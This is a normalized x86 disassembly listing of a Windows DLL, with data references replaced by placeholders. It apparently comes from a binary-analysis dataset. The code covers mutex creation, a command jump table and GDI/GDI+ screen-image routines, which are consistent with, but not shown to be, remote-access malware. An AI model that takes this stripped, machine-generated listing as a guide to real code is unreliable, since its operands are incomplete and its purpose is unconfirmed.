mov eax [ ebp - 0x80 ]
push eax
call sub_10019ce4
add esp 0x4
mov ecx esi
mov [ ebp - 0x50 ] 0xf
mov [ ebp - 0x54 ] 0x0
mov [ ebp - 0x64 ] 0x0
call sub_10007320
push esi
call sub_10019ce4
push edi
call sub_1001a818
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x64 ]
push ecx
call sub_10019ce4
add esp 0x4
xor eax eax
mov dx [ rw-data ]
mov cl [ rw-data ]
mov [ eax + 0x4 ] dx
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6 ] 0x66
mov [ eax + 0x7 ] cl
mov [ eax + 0x8 ] ebx
mov [ eax + 0xc ] edx
mov [ eax ] 0x0
jmp r-xdata
mov edi eax
sub_10007d90
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
push esi
push 0xffffffff
push 0x0
push eax
push 0x0
mov [ ebp - 0x4 ] 0x0
call sub_100071a0
mov esi [ ebp + 0x8 ]
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
push eax
mov ecx esi
call sub_10003860
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_10007de0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push esi
push 0xffffffff
push 0x0
push eax
mov [ ebp - 0x4 ] 0x0
call sub_10007570
mov esi [ ebp + 0x8 ]
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
push eax
mov ecx esi
call sub_10003860
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_10007e30
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c418
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
call sub_10007990
mov eax [ esi ]
push eax
call sub_10019ce4
add esp 0x4
mov [ esi ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_10007e90
push ebp
mov ebp esp
push 0xffffffff
push sub_1002cc28
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
cmp [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0xffffffff
test esi esi
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
add ecx 0x2c
call sub_100078a0
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0xffffffff
test esi esi
je r-xdata
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x8
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x8
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
sub_10007f90
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c461
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x14 ] edi
push 0x2
mov [ edi ] r--data
call sub_1001a818
xor ebx ebx
add esp 0x4
cmp eax ebx
je r-xdata
xor eax eax
xor ecx ecx
mov [ eax ] cx
jmp r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] ebx
call sub_10019ba5
push r--data
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x20 ] r--data
call sub_1001a898
int3
mov [ esi ] eax
xor ecx ecx
mov [ eax ] ecx
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ esi ]
mov [ eax ] esi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
mov ecx [ rw-data ]
push 0x3c
mov [ ebp - 0x4 ] 0x1
mov [ edi + 0x28 ] ecx
call sub_1001a818
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x2
cmp eax ebx
je r-xdata
mov [ edi + 0x4 ] eax
mov [ edi ] r--data
xor edx edx
mov [ edi + 0x20 ] 0x7
mov [ edi + 0x1c ] ebx
mov [ edi + 0xc ] dx
lea esi [ edi + 0x2c ]
push 0x8
mov [ ebp - 0x4 ] ebx
mov [ esi ] ebx
call sub_1001a818
add esp 0x4
cmp eax ebx
je r-xdata
xor eax eax
mov edx [ rw-data ]
push edx
mov ecx eax
call sub_10013720
jmp r-xdata
mov cx [ rw-data ]
mov [ edi + 0x8 ] eax
mov eax [ edi + 0x4 ]
mov [ eax ] cx
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_100080b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c102
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov ecx [ edi + 0x4 ]
mov esi [ ebp + 0x8 ]
cmp esi ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax esi
ja r-xdata
mov ecx [ edi + 0x4 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
xor edx edx
mov [ ebp - 0x4 ] 0x1
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_10005090
sub esi eax
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x1c
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] edx
mov [ ecx ] ax
push esi
mov ecx [ edi ]
lea eax [ esi * 8 ]
sub eax esi
lea eax [ ecx + eax * 4 ]
mov ecx [ edi + 0x4 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
xor edx edx
mov [ ebp - 0x4 ] edx
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_10005090
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] edx
mov [ ecx ] dx
push eax
jmp r-xdata
call sub_10003860
sub_10008190
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c4a9
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
xor esi esi
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] edi
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
xor ebx ebx
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x3c ] 0x1
mov [ ebp - 0x30 ] ebx
cmp [ ebp + 0x10 ] esi
jbe r-xdata
lea eax [ esi + 0x2 ]
push 0x2
push eax
mov [ ebp - 0x34 ] eax
call sub_1001a8ef
mov ecx [ ebp - 0x34 ]
push esi
sub edi esi
add edi ebx
push edi
lea edx [ ecx + ecx ]
push edx
push eax
mov [ ebp - 0x30 ] eax
call sub_1001a92f
mov esi [ ebp - 0x30 ]
add esp 0x18
xor eax eax
mov [ ebp - 0x2c ] ax
mov eax esi
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] 0x0
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0x2c ]
call sub_100034e0
mov edi [ ebp - 0x38 ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx edi
mov [ ebp - 0x4 ] 0x2
call sub_100080b0
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
inc ebx
inc esi
mov [ ebp - 0x30 ] ebx
cmp ebx [ ebp + 0x10 ]
jb r-xdata
lea ebx [ esi + 0x2 ]
push 0x2
push ebx
call sub_1001a8ef
mov edx [ ebp - 0x34 ]
sub edx esi
add edx [ ebp - 0x30 ]
push esi
mov edi eax
push edx
lea eax [ ebx + ebx ]
push eax
push edi
call sub_1001a92f
xor esi esi
add esp 0x18
xor ecx ecx
mov eax edi
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] cx
lea edx [ eax + 0x2 ]
mov edi edi
push esi
call sub_1001a3eb
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn 0xc
mov edx [ ebp - 0x2c ]
push edx
call sub_10019ce4
add esp 0x4
movzx eax [ edi + ebx ]
movsx ecx [ rw-data ]
cmp eax ecx
jne r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push edi
lea ecx [ ebp - 0x2c ]
call sub_100034e0
mov ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x2c ]
mov ebx 0x1
push edx
mov [ ebp - 0x4 ] ebx
call sub_100080b0
cmp [ ebp - 0x18 ] 0x8
mov [ ebp - 0x4 ] 0x0
jb r-xdata
add [ ebp - 0x30 ] ebx
push edi
call sub_1001a3eb
mov ebx [ ebp - 0x30 ]
mov edi [ ebp - 0x34 ]
add esp 0x4
mov eax [ ebp - 0x2c ]
push eax
call sub_10019ce4
add esp 0x4
sub_10008350
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c55e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
push 0x18
mov esi ecx
mov [ ebp - 0x6c ] eax
call sub_1001a818
add esp 0x4
mov [ ebp - 0x68 ] eax
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
push 0xc
push rw-data
mov ecx ebx
mov [ ebp - 0x4 ] 0xffffffff
call sub_10012790
movzx eax [ ebp + 0x8 ]
add eax 0xffffff9b
cmp eax 0x4
ja r-xdata
mov ecx eax
call sub_10012700
mov ebx eax
push 0x6a
push rw-data
mov ecx ebx
call sub_10012770
sub esp 0x1c
mov edx esp
mov [ ebp - 0x68 ] esp
push edx
mov ecx ebx
call sub_10012c50
mov ecx esi
call sub_100077e0
test ebx ebx
je r-xdata
jmp [ eax * 4 + jump_table_10008a10 ]
xor al al
mov ecx ebx
call sub_10012740
push ebx
call sub_10019ce4
add esp 0x4
mov ecx [ ebp - 0x6c ]
push edi
push ecx
lea edx [ ebp - 0x7c ]
push edx
mov ecx esi
call sub_10008190
mov ecx [ ebp - 0x7c ]
mov eax [ ebp - 0x78 ]
mov [ ebp - 0x4 ] 0x1
cmp ecx eax
jne r-xdata
mov edx [ ebp - 0x6c ]
push edi
push edx
lea eax [ ebp - 0x7c ]
push eax
mov ecx esi
call sub_10008190
mov ecx [ ebp - 0x7c ]
mov eax [ ebp - 0x78 ]
mov [ ebp - 0x4 ] 0x4
cmp ecx eax
jne r-xdata
mov eax [ ebp - 0x6c ]
push edi
push eax
lea ecx [ ebp - 0x7c ]
push ecx
mov ecx esi
call sub_10008190
mov ecx [ ebp - 0x7c ]
mov eax [ ebp - 0x78 ]
mov [ ebp - 0x4 ] 0x7
cmp ecx eax
je r-xdata
mov edx [ ebp - 0x6c ]
push edi
push edx
lea eax [ ebp - 0x7c ]
push eax
mov ecx esi
call sub_10008190
mov ecx [ ebp - 0x7c ]
mov eax [ ebp - 0x78 ]
mov [ ebp - 0x4 ] 0xd
cmp ecx eax
je r-xdata
mov eax [ ebp - 0x6c ]
push edi
push eax
lea ecx [ ebp - 0x8c ]
push ecx
mov ecx esi
call sub_10008190
mov ecx [ ebp - 0x8c ]
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x4 ] 0x10
cmp ecx eax
je r-xdata
sub eax ecx
mov ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
je r-xdata
lea ecx [ ebp - 0x7c ]
jmp r-xdata
sub eax ecx
mov ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x3
je r-xdata
lea ecx [ ebp - 0x7c ]
jmp r-xdata
lea ecx [ ebp - 0x7c ]
jmp r-xdata
sub eax ecx
mov ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
jb r-xdata
sub eax ecx
mov ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x3
jne r-xdata
lea ecx [ ebp - 0x8c ]
sub eax ecx
mov ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
jne r-xdata
push 0x10
push rw-data
mov ecx ebx
call sub_10012770
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x68 ] esp
push ecx
mov ecx ebx
call sub_10012c50
mov ecx esi
call sub_100077e0
mov eax [ ebp - 0x7c ]
mov edx [ rw-data ]
add eax 0x38
push edx
push eax
call sub_10006b80
add esp 0x8
test al al
mov eax [ ebp - 0x7c ]
push 0x0
je r-xdata
lea ecx [ ebp - 0x7c ]
call sub_10004ad0
lea ecx [ ebp - 0x7c ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
call sub_100026a0
test ebx ebx
je r-xdata
push 0x10
push rw-data
mov ecx ebx
call sub_10012770
sub esp 0x1c
mov edx esp
mov [ ebp - 0x68 ] esp
push edx
mov ecx ebx
call sub_10012c50
mov ecx esi
call sub_100077e0
mov eax [ ebp - 0x7c ]
mov ecx [ rw-data ]
add eax 0x38
push ecx
push eax
call sub_10006b80
add esp 0x8
test al al
mov eax [ ebp - 0x7c ]
push 0x1
je r-xdata
lea ecx [ ebp - 0x7c ]
call sub_10004ad0
lea ecx [ ebp - 0x7c ]
jmp r-xdata
lea ecx [ ebp - 0x7c ]
call sub_10004ad0
push r--data
lea ecx [ ebp - 0x48 ]
call sub_10003ae0
mov ecx [ ebp - 0x7c ]
push eax
push ecx
lea edx [ ebp - 0x64 ]
push edx
mov [ ebp - 0x4 ] 0x8
call sub_10007d90
mov ecx [ ebp - 0x7c ]
add ecx 0x1c
push ecx
push eax
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] 0x9
call sub_10007de0
add esp 0x18
lea ecx [ ebp - 0x64 ]
call sub_100018c0
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xc
call sub_100018c0
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x6c ]
add eax eax
sub edi eax
push edi
add ecx eax
push ecx
sub esp 0x1c
lea edx [ ebp - 0x2c ]
mov ecx esp
mov [ ebp - 0x68 ] esp
push edx
call sub_10002030
mov ecx [ esi + 0x8 ]
call sub_100137e0
mov ecx [ esi + 0x8 ]
sub esp 0x1c
mov eax esp
mov [ ebp - 0x68 ] esp
push eax
call sub_10013ef0
mov ecx esi
call sub_100077e0
push 0x68
push rw-data
mov ecx ebx
call sub_10012770
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x68 ] esp
push ecx
mov ecx ebx
call sub_10012c50
mov ecx esi
call sub_100077e0
lea ecx [ ebp - 0x7c ]
call sub_10004ad0
lea ecx [ ebp - 0x2c ]
call sub_100018c0
lea ecx [ ebp - 0x7c ]
jmp r-xdata
push 0x10
push rw-data
mov ecx ebx
call sub_10012770
sub esp 0x1c
mov edx esp
mov [ ebp - 0x68 ] esp
push edx
mov ecx ebx
call sub_10012c50
mov ecx esi
call sub_100077e0
mov eax [ ebp - 0x7c ]
mov ecx [ rw-data ]
add eax 0x38
push ecx
push eax
call sub_10006b80
add esp 0x8
test al al
mov eax [ ebp - 0x7c ]
push 0x2
je r-xdata
mov al 0x1
jmp r-xdata
mov ecx ebx
call sub_10012740
push ebx
call sub_10019ce4
add esp 0x4
lea ecx [ ebp - 0x8c ]
call sub_10004ad0
push 0x10
push rw-data
mov ecx ebx
call sub_10012770
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x68 ] esp
push ecx
mov ecx ebx
call sub_10012c50
mov ecx esi
call sub_100077e0
mov eax [ ebp - 0x8c ]
mov edx [ rw-data ]
add eax 0x38
push edx
push eax
call sub_10006b80
add esp 0x8
test al al
mov eax [ ebp - 0x8c ]
push 0x3
je r-xdata
push 0x0
sub esp 0x1c
add eax 0x1c
mov ecx esp
mov [ ebp - 0x68 ] esp
push eax
call sub_10002030
mov edx [ ebp - 0x7c ]
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x6c ] esp
mov [ ebp - 0x4 ] 0x3
push edx
push 0x1
sub esp 0x1c
add eax 0x1c
mov ecx esp
mov [ ebp - 0x68 ] esp
push eax
call sub_10002030
mov eax [ ebp - 0x7c ]
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x6c ] esp
mov [ ebp - 0x4 ] 0x2
push eax
jmp r-xdata
push 0x0
sub esp 0x1c
add eax 0x1c
mov ecx esp
mov [ ebp - 0x68 ] esp
push eax
call sub_10002030
mov eax [ ebp - 0x7c ]
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x6c ] esp
mov [ ebp - 0x4 ] 0x6
push eax
push 0x1
sub esp 0x1c
add eax 0x1c
mov ecx esp
mov [ ebp - 0x68 ] esp
push eax
call sub_10002030
mov edx [ ebp - 0x7c ]
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x6c ] esp
mov [ ebp - 0x4 ] 0x5
push edx
jmp r-xdata
push 0x0
sub esp 0x1c
add eax 0x1c
mov ecx esp
mov [ ebp - 0x68 ] esp
push eax
call sub_10002030
mov eax [ ebp - 0x7c ]
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x6c ] esp
mov [ ebp - 0x4 ] 0xf
push eax
push 0x1
sub esp 0x1c
add eax 0x1c
mov ecx esp
mov [ ebp - 0x68 ] esp
push eax
call sub_10002030
mov edx [ ebp - 0x7c ]
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x6c ] esp
mov [ ebp - 0x4 ] 0xe
push edx
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn 0xc
push 0x0
sub esp 0x1c
add eax 0x1c
mov ecx esp
mov [ ebp - 0x68 ] esp
push eax
call sub_10002030
mov edx [ ebp - 0x8c ]
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x6c ] esp
mov [ ebp - 0x4 ] 0x12
push edx
push 0x1
sub esp 0x1c
add eax 0x1c
mov ecx esp
mov [ ebp - 0x68 ] esp
push eax
call sub_10002030
mov eax [ ebp - 0x8c ]
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x6c ] esp
mov [ ebp - 0x4 ] 0x11
push eax
jmp r-xdata
call sub_10002030
mov [ ebp - 0x4 ] 0x1
mov ecx [ esi + 0x8 ]
call sub_10013f40
mov ecx [ esi + 0x8 ]
sub esp 0x1c
mov eax esp
mov [ ebp - 0x68 ] esp
push eax
call sub_10013ef0
mov ecx esi
call sub_100077e0
push 0x78
push rw-data
mov ecx ebx
call sub_10012770
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x68 ] esp
push ecx
mov ecx ebx
call sub_10012c50
mov ecx esi
call sub_100077e0
call sub_10002030
mov [ ebp - 0x4 ] 0x4
mov ecx [ esi + 0x8 ]
call sub_10013f40
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x68 ] esp
push ecx
mov ecx [ esi + 0x8 ]
call sub_10013ef0
mov ecx esi
call sub_100077e0
push 0x78
push rw-data
mov ecx ebx
call sub_10012770
sub esp 0x1c
mov edx esp
mov [ ebp - 0x68 ] esp
push edx
jmp r-xdata
call sub_10002030
mov [ ebp - 0x4 ] 0xd
mov ecx [ esi + 0x8 ]
call sub_10013f40
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x68 ] esp
push ecx
mov ecx [ esi + 0x8 ]
call sub_10013ef0
mov ecx esi
call sub_100077e0
push 0x78
push rw-data
jmp r-xdata
call sub_10002030
mov [ ebp - 0x4 ] 0x10
mov ecx [ esi + 0x8 ]
call sub_10013f40
mov ecx [ esi + 0x8 ]
sub esp 0x1c
mov eax esp
mov [ ebp - 0x68 ] esp
push eax
call sub_10013ef0
mov ecx esi
call sub_100077e0
push 0x78
push rw-data
mov ecx ebx
call sub_10012770
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x68 ] esp
push ecx
mov ecx ebx
call sub_10012c50
mov ecx esi
call sub_100077e0
sub_10008a30
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c598
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x10 ] edi
push 0x0
push 0x0
push 0x0
call [ CreateMutexW@IAT ]
mov [ edi + 0x44 ] eax
test eax eax
jne r-xdata
mov esi [ Sleep@IAT ]
push 0x14
call esi
cmp [ edi + 0x3c ] 0x0
je r-xdata
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x14 ] r--data
call sub_10019b1d
push r--data
lea ecx [ ebp - 0x30 ]
push ecx
call sub_1001a898
push 0x14
call esi
jmp r-xdata
lea edx [ ebp - 0x3c ]
lea ecx [ edi + 0x2c ]
push edx
call sub_100018f0
mov ecx [ eax ]
test ecx ecx
jne r-xdata
mov edx [ ecx ]
xor edx edx
jmp r-xdata
mov edx [ edx + 0x4 ]
mov eax [ edx + eax * 4 ]
mov edx [ eax + ecx * 8 + 0x4 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ eax ]
xor esi esi
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x18 ] ecx
test edx edx
je r-xdata
sub eax esi
mov ecx [ eax + 0x8 ]
mov esi [ edx + 0x8 ]
mov eax ecx
shr eax 0x1
and ecx 0x1
cmp esi eax
ja r-xdata
mov edx [ ebp - 0x24 ]
mov eax [ edx + 0xc ]
mov ecx [ edx + 0x8 ]
mov dl [ edx + 0x6 ]
push eax
mov [ ebp - 0x1c ] dl
mov eax [ ebp - 0x1c ]
push ecx
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x0
call sub_10008350
lea ecx [ edi + 0x2c ]
call sub_10007770
mov [ ebp - 0x4 ] 0xffffffff
test esi esi
je r-xdata
mov ecx [ edx + 0x4 ]
test ecx ecx
je r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov esi [ ebp - 0x20 ]
jmp r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
lea edi [ ecx + 0x1 ]
lea ebx [ edx + 0x4 ]
mov eax ecx
[ ebx ] edi
cmp eax ecx
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
jmp r-xdata
mov ecx [ ebp - 0x18 ]
push edx
push ecx
lea ecx [ ebp - 0x24 ]
call sub_100030d0
mov ecx [ edx + 0x4 ]
test ecx ecx
jne r-xdata
jmp r-xdata
mov edi [ ebp - 0x10 ]
sub_10008bb0
push ebp
mov ebp esp
sub esp 0x8
push esi
push edi
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x4 ]
xor edi edi
push ecx
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
call GdipGetImageEncodersSize
mov esi [ ebp - 0x8 ]
cmp esi edi
jne r-xdata
push ebx
push esi
call sub_1001aa2a
mov ebx eax
add esp 0x4
cmp ebx edi
jne r-xdata
pop edi
or eax 0xffffffff
pop esi
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x4 ]
push ebx
push esi
push edx
call GdipGetImageEncoders
xor esi esi
cmp [ ebp - 0x4 ] edi
jbe r-xdata
pop ebx
pop edi
or eax 0xffffffff
pop esi
mov esp ebp
pop ebp
retn 0x8
push ebx
call sub_1001a3eb
add esp 0x4
pop ebx
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x8
lea edi [ ebx + 0x30 ]
sbb eax eax
sbb eax 0xffffffff
test dx dx
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax esi
imul eax eax 0x4c
mov edx [ eax + ebx ]
add eax ebx
mov [ ecx ] edx
mov edx [ eax + 0x4 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x8 ]
mov [ ecx + 0x8 ] edx
mov eax [ eax + 0xc ]
push ebx
mov [ ecx + 0xc ] eax
call sub_1001a3eb
add esp 0x4
pop ebx
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x8
inc esi
add edi 0x4c
cmp esi [ ebp - 0x4 ]
jb r-xdata
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ edi ]
test eax eax
je r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
sub_10008ca0
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
push eax
mov [ esi ] r--data
call GdipDisposeImage
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call GdipFree
sub_10008cd0
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
mov [ ebp - 0x4 ] 0x0
call GdipCloneImage
test eax eax
je r-xdata
push 0x10
call GdipAlloc
test eax eax
je r-xdata
mov [ esi + 0x8 ] eax
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
mov esi [ esi + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
pop esi
mov esp ebp
pop ebp
retn
sub_10008d20
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
sub eax [ esi ]
push edi
sar eax 0x2
xor edi edi
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
mov edi [ esi ]
cmp edi ecx
je r-xdata
mov ebx [ DeleteObject@IAT ]
lea esp [ esp ]
mov eax [ esi ]
test eax eax
je r-xdata
mov eax ecx
sub eax ecx
sar eax 0x2
lea ebx [ eax * 4 ]
push ebx
push ecx
push edi
call sub_1001a060
add esp 0xc
add ebx edi
mov [ esi + 0x4 ] ebx
mov ecx [ esi ]
mov edx [ ecx + edi * 4 ]
push edx
call ebx
mov eax [ esi + 0x4 ]
sub eax [ esi ]
inc edi
sar eax 0x2
cmp edi eax
jb r-xdata
xor eax eax
pop edi
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
pop ebx
retn
push eax
call sub_10019ce4
add esp 0x4
sub_10008da0
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push ebx
mov ebx [ GetDeviceCaps@IAT ]
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x8
push esi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
call ebx
push 0xa
push esi
mov edi eax
call ebx
push esi
mov ebx eax
call [ CreateCompatibleDC@IAT ]
push ebx
push edi
push esi
mov [ ebp + 0x10 ] eax
call [ CreateCompatibleBitmap@IAT ]
push eax
